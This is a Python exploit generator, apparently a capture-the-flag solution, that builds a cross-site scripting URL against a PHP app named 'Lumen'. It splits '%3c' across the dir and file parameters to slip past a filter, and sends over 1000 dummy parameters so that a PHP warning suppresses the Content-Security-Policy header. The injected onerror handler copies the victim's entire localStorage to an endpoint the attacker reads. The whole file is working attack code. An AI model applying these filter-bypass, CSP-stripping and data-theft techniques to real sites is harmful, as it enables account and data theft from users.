#!/usr/bin/env python3
"""
Lumen payload generator.

Builds the `?p=view` URL that:

  1. injects a single attacker-controlled `<img onerror=...>` element into the
     unescaped 404 reflection, by smuggling one raw `<` past the `%3c` filter
     (the filter is per-parameter, the urldecode is on the concatenation, so we
     split `%3c` across the dir/file boundary), and

  2. carries >1000 GET parameters so PHP prints the "Input variables exceeded"
     warning during input parsing -- before index.php calls header() -- which
     drops the Content-Security-Policy header for the whole response.

The onerror handler reads the whole localStorage and writes it to the
same-origin `?p=trace` store, which we read back afterwards.

Usage:
    python3 gen.py [TRACE_ID] [TARGET_ORIGIN]

    TRACE_ID       8-64 [A-Za-z0-9] chars      (default: random)
    TARGET_ORIGIN  origin the bot navigates to  (default: http://127.0.0.1:5000)
"""
import sys
import string
import random
import urllib.parse

N_DUMMIES = 1001  # + p,dir,file  => >1000 input vars => CSP header dropped


def build(trace_id: str, origin: str = "http://127.0.0.1:5000") -> str:
    # JS run inside the onerror handler on the flag origin.
    code = (
        "new Image().src='/?p=trace&id=" + trace_id +
        "&note='+encodeURIComponent(JSON.stringify(localStorage))"
    )
    # P = the raw HTML we want to appear *after* the smuggled '<'.
    payload = 'img src=x onerror="%s">' % code

    # $path = urldecode( htmlspecialchars($_GET['dir']) . htmlspecialchars($_GET['file']) )
    #
    # We want the *$_GET-level* values to be:
    #   dir  = "docs/%3"          (no '%3c' on its own -> passes clean())
    #   file = "c" + quote(P)     (leading 'c' completes '%3c' after concat)
    #
    # concat -> "docs/%3c" + quote(P)  ->  urldecode  ->  "docs/<" + P
    get_dir = "docs/%3"
    get_file = "c" + urllib.parse.quote(payload, safe="")

    # Wire level: PHP url-decodes once, so encode the '%' (and everything else)
    # one more time to reproduce the $_GET-level strings exactly.
    wire_dir = urllib.parse.quote(get_dir, safe="")
    wire_file = urllib.parse.quote(get_file, safe="")

    base = "%s/?p=view&dir=%s&file=%s" % (origin.rstrip("/"), wire_dir, wire_file)
    dummies = "&".join("z%d=1" % i for i in range(1, N_DUMMIES + 1))
    return base + "&" + dummies


def rand_id(n: int = 12) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


if __name__ == "__main__":
    tid = sys.argv[1] if len(sys.argv) > 1 else rand_id()
    origin = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:5000"
    url = build(tid, origin)
    sys.stderr.write("trace id: %s\n" % tid)
    sys.stderr.write("url length: %d\n" % len(url))
    print(url)
